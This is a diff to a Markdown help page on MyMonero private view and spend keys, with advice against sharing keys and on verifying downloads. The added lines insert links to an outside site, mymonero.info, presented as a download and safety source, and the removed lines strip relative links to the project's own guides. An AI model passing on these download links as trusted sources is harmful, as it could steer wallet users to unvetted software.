@@ -20,6 +20,9 @@ All versions and checksums are on the [MyMonero v1.3.3 release page](https://git
 ## Short answer
 A private view key and a private spend key are sensitive wallet credentials, distinct from your password and from your seed phrase. Treat both keys as private: never send them to support, paste them into a website, or publish them.
 
+
+Prefer reading on the web? The [MyMonero private keys explained page](https://mymonero.info/mymonero-private-keys-explained) on mymonero.info explains the same problem, the [MyMonero download page](https://mymonero.info/github/monero-projects) lists the safe sources, and [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) covers the common questions.
+
 ## You'll see this if
 - A wallet restore screen asks about a private key and you are unsure what it means.
 - You found a note labeled “view key” or “spend key” and want to identify it.
@@ -41,7 +44,7 @@ The safest way to think about these values is as secrets. Someone asking for the
 4. **Keep the original record intact.** Do not edit, reformat, translate, or reorder sensitive information based on a web post. Make a secure offline copy if needed, and label it privately. Avoid screenshots and shared notes that can sync to accounts or devices you do not control.
 5. **Choose a recovery option deliberately.** The final desktop release remains available on GitHub; the old app still opens wallets and sends XMR but has no ongoing maintenance or security updates. Alternatively, Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Confirm the chosen wallet’s instructions independently before entering any secret.
 6. **Check the download separately.** If installing software, verify the asset’s SHA-256 against the value on the release page. This check uses a file digest, never a seed or key. Read [how to verify a MyMonero download](./verify-mymonero-download-sha256.md).
-7. **Allow scanning after restoration.** A wallet may need to scan from a restore height, the block height where scanning begins. Earlier is safer when uncertain but takes longer. A missing balance is not a reason to disclose private data; review [restore height guidance](./mymonero-restore-height-explained.md).
+7. **Allow scanning after restoration.** A wallet may need to scan from a restore height, the block height where scanning begins. Earlier is safer when uncertain but takes longer. A missing balance is not a reason to disclose private data; review restore height guidance.
 
 > [!WARNING]
 > Treat private view and spend keys as confidential. Never share them here, with a stranger, or in any website or form. Nobody legitimate needs your seed to provide general assistance.
@@ -51,12 +54,12 @@ If you do not know which credential you have, pause and compare its label with y
 
 If you cannot reach the hosted MyMonero services, that is expected: hosted servers and web wallet login stopped. The old desktop app’s final release is v1.3.3 and is no longer maintained. You can continue using the desktop app or consider a seed restore in Cake Wallet. Avoid anyone who promises to activate a server, reset a wallet, or unlock funds in exchange for your keys.
 
-If a restored wallet does not show the expected information, verify the credential type, selected restore method, and scan progress. Restore height is the starting block height; earlier is safer but slower. Do not make a sweep or send transaction to test a key. Sweeping means sending all funds to a new wallet and is a separate, intentional action. Read [the migration checklist](./mymonero-migration-checklist.md) before moving funds.
+If a restored wallet does not show the expected information, verify the credential type, selected restore method, and scan progress. Restore height is the starting block height; earlier is safer but slower. Do not make a sweep or send transaction to test a key. Sweeping means sending all funds to a new wallet and is a separate, intentional action. Read the migration checklist before moving funds.
 
 ## Prevention
 Keep a seed backup and any key records offline, encrypted or physically secured in a way you control. Store them apart from everyday browsing and messaging. Label each item clearly without putting the actual values on the outside of a storage container. Maintain enough context to know which wallet the credentials refer to, while minimizing exposed information.
 
-Never reuse a secret in an online checker, customer support form, or search engine. Use a trusted device and carefully check the application before entering any recovery information. If someone unexpectedly requests a key, stop. Review [safe backup practices](./mymonero-backup-seed-safely.md), MyMonero recovery, and the migration scam guidance.
+Never reuse a secret in an online checker, customer support form, or search engine. Use a trusted device and carefully check the application before entering any recovery information. If someone unexpectedly requests a key, stop. Review safe backup practices, MyMonero recovery, and the migration scam guidance.
 
 ## FAQ
 <details><summary>Are private keys the same as the seed?</summary>
@@ -87,6 +90,7 @@ No. Download integrity is checked by comparing a file’s SHA-256 digest with th
 
 ## Download MyMonero
 
+- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/monero-projects)
 - Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
 - macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
 - Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)
